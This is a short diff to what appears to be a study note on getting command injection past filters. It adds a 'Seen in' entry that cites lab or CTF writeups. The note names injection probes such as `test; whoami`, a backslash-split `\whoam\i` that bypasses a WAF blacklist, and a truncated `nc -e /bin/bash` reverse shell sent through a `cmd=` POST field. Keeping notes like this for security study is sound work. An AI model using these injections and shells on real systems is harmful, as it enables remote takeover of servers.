@@ -41,4 +41,4 @@ A filter may block metacharacters or "dangerous" commands before they reach the 
 
 ## Seen in
 
-[[trailpack]] (complaints form `test; whoami` → `balutron` → base64 reverse shell), [[internal]] (path parameter behind a blacklist WAF → `\whoam\i` → quote-split bash reverse shell)
+[[trailpack]] (complaints form `test; whoami` → `balutron` → base64 reverse shell), [[internal]] (path parameter behind a blacklist WAF → `\whoam\i` → quote-split bash reverse shell), [[dark]] (`process.php` POST `cmd=` executed `nc -e /bin/bash …` — note the gap: the writeup fires the reverse shell without ever showing the `; id` probe that proved the field was executable)
